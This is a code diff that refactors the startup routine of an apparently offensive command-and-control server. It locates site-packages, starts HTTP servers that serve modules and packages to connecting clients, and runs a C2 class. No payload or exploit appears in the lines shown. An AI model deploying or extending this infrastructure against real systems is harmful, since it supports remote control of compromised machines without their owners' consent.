@@ -111,9 +111,16 @@ def main():
     )
 
     modules = os.path.abspath('modules')
-    packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
-    
-    if not len(packages):
+    site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
+        
+    if len(site_packages):
+        n = 0
+        packages = site_packages[0]
+        for path in site_packages:
+            if n < len(os.listdir(path)):
+                n = len(os.listdir(path))
+                packages = path
+    else:
         util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
         sys.exit(0)
 
@@ -124,17 +131,13 @@ def main():
             util.log("Unable to create directory 'data' (permission denied)")
 
     options = parser.parse_args()
-    __debug = options.debug
 
-    globals()['debug'] = __debug
-    globals()['packages'] = packages[0]
-    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
+    globals()['debug'] = options.debug
+    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
     globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
     globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, options.port + 3), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
-
-    global c2
-    c2.run()
+    globals()['c2'].run()
 
 
 class C2():
